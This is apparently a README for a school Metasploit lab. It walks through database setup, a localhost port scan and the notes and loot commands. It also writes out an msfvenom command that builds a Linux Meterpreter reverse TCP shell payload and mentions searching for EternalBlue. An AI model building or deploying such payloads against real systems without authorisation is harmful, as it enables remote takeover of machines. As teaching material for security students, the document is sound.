# 0x03_metasploit_basics

## Project Overview

This project provides a comprehensive guide to setting up and using Metasploit Framework. It covers installation, basic usage, payload creation, exploration of auxiliary modules, and documentation of findings using the `notes` and `loot` commands.

## Learning Objectives

- Set up Metasploit with PostgreSQL database
- Understand basic Metasploit commands and workflow
- Create and deploy payloads using msfvenom
- Explore and use auxiliary modules for port scanning
- Document findings using `notes` and `loot` commands
- Export data to CSV format

## Requirements

- Ubuntu/Debian Linux system
- PostgreSQL
- Metasploit Framework
- sudo privileges

## Files

- `metasploit_workflow.sh` - Automated workflow script for Metasploit operations
- `notes.csv` - Exported notes from Metasploit database
- `payload.elf` - Generated Linux Meterpreter reverse shell payload

## Prerequisites Installation

Ensure Metasploit Framework and PostgreSQL are installed:

```bash
sudo apt-get update
sudo apt-get install -y metasploit-framework postgresql postgresql-contrib
```

## Usage

1. Make the script executable:
```bash
chmod +x metasploit_workflow.sh
```

2. Run the script:
```bash
./metasploit_workflow.sh
```

The script will execute automatically and perform all tasks in sequence.

## Script Workflow

### 1. PostgreSQL and Metasploit Database Setup
- Starts the PostgreSQL service
- Initializes the Metasploit database with `msfdb init --non-interactive`
- Prepares the database for storing scan results, notes, and loot

### 2. Payload Generation
- Detects the local IP address automatically using `hostname -I`
- Generates a Meterpreter reverse TCP payload using msfvenom:
  - **Payload type**: `linux/x64/meterpreter/reverse_tcp`
  - **LHOST**: Auto-detected local IP address
  - **LPORT**: 4444
  - **Format**: ELF executable
  - **Output**: `payload.elf`

### 3. Database Status Verification
- Checks the database connection status with `db_status`
- Searches for EternalBlue exploits in the Metasploit database

### 4. Port Scanning with Auxiliary Module
- Uses the TCP port scanner: `auxiliary/scanner/portscan/tcp`
- Scans localhost (127.0.0.1) for common ports: 22, 80, 443, 5432
- Demonstrates practical use of Metasploit auxiliary modules

### 5. Documentation and Data Storage
- Saves notes using the `notes` command with project information
- Stores loot data using the `loot` command with scan results
- Associates data with the target host (127.0.0.1)

### 6. Data Export
- Exports all loot to CSV format using `loot -t csv`
- Exports notes to `notes.csv` file using `notes -o notes.csv`
- Generates reports for documentation purposes

## Key Metasploit Commands Used

| Command | Purpose |
|---------|---------|
| `db_status` | Verify database connection |
| `search eternalblue` | Search for specific exploits |
| `use auxiliary/scanner/portscan/tcp` | Select port scanning module |
| `set RHOSTS` | Define target host(s) |
| `set PORTS` | Specify ports to scan |
| `run` | Execute the selected module |
| `notes -a` | Add notes to database |
| `loot -a` | Add loot/data to database |
| `loot -t csv` | Export loot as CSV |
| `notes -o` | Export notes to file |

## Output Files

After successful execution, the following files will be generated:

1. **payload.elf** - Linux ELF executable containing Meterpreter reverse shell
2. **notes.csv** - CSV export of all notes and project documentation from the Metasploit database

## Script Output Sections

The script provides clear output markers for each phase:
- "Start PostgreSQL / Métasploit Database"
- "Generate ELF Payload"
- "Search DB status"
- "Scan localhost ports"
- "Save notes and loot"
- "Export notes and loot to CSV"
- "All tasks completed !"

## Technical Details

### Payload Specifications
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o payload.elf
```
- Creates a 64-bit Linux Meterpreter payload
- Configured for reverse TCP connection
- Dynamically uses the host's IP address

### Port Scan Configuration
- **Module**: auxiliary/scanner/portscan/tcp
- **Target**: 127.0.0.1 (localhost)
- **Ports**: 22 (SSH), 80 (HTTP), 443 (HTTPS), 5432 (PostgreSQL)

## Security Notice

⚠️ **WARNING**: This project is for educational purposes only. 

- Use Metasploit only on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal
- The generated payload should only be used in controlled lab environments
- Always comply with local laws and ethical hacking guidelines

## Troubleshooting

If you encounter issues:

1. **PostgreSQL not starting**: Check service status with `sudo systemctl status postgresql`
2. **Database initialization fails**: Try `sudo msfdb reinit`
3. **Payload generation fails**: Ensure msfvenom is in your PATH
4. **Permission errors**: Run with appropriate sudo privileges

## Repository

- **GitHub repository**: holbertonschool-cyber_security
- **Directory**: vulnerability_research_exploitation/0x03_metasploit_basics
- **Files**: metasploit_workflow.sh, notes.csv, payload.elf